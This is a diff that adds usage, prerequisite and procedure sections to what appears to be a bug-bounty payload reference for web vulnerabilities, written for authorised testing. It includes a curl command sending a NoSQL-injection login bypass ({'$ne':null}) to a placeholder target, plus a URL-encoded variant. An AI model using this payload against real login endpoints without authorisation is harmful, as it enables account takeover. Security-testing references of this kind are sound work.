@@ -14,6 +14,33 @@ Payloads, bypass tables, wordlists, and submission rules.
 
 ---
 
+## When to Use
+
+- You need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques.
+- To check if a finding is submittable.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `ffuf`, `gf`, `hashcat`, `interactsh-client`, `mysql`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+
+# URL-encoded for GET forms:
+# username%5B%24ne%5D=null&password%5B%24ne%5D=null
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## XSS PAYLOADS
 
 ### Basic Probes
